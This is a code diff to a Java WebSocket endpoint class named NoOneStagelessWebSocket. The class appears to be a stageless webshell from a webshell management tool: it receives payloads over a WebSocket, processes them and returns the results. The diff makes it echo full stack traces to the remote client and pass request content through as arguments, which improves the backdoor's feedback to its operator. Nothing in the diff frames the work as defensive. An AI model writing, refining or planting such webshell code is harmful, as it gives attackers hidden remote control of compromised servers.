@@ -4,9 +4,7 @@ import javax.websocket.Endpoint;
 import javax.websocket.EndpointConfig;
 import javax.websocket.MessageHandler;
 import javax.websocket.Session;
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
+import java.io.*;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.net.URL;
@@ -38,7 +36,10 @@ public class NoOneStagelessWebSocket extends Endpoint implements MessageHandler.
             byte[] result = wrapResData(transformResData(outputStream.toByteArray()));
             session.getBasicRemote().sendBinary(ByteBuffer.wrap(result));
         } catch (Throwable e) {
-            e.printStackTrace();
+            try {
+                session.getBasicRemote().sendBinary(ByteBuffer.wrap(getStackTraceAsString(e).getBytes()));
+            } catch (IOException ignored) {
+            }
         }
     }
 
@@ -49,7 +50,7 @@ public class NoOneStagelessWebSocket extends Endpoint implements MessageHandler.
     }
 
     private byte[] getArgFromContent(byte[] content) {
-        return null;
+        return content;
     }
 
     private byte[] transformReqPayload(byte[] input) {
@@ -124,5 +125,12 @@ public class NoOneStagelessWebSocket extends Endpoint implements MessageHandler.
             }
             out.close();
         }
+    }
+
+    private String getStackTraceAsString(Throwable throwable) {
+        StringWriter sw = new StringWriter();
+        PrintWriter pw = new PrintWriter(sw);
+        throwable.printStackTrace(pw);
+        return sw.toString();
     }
 }
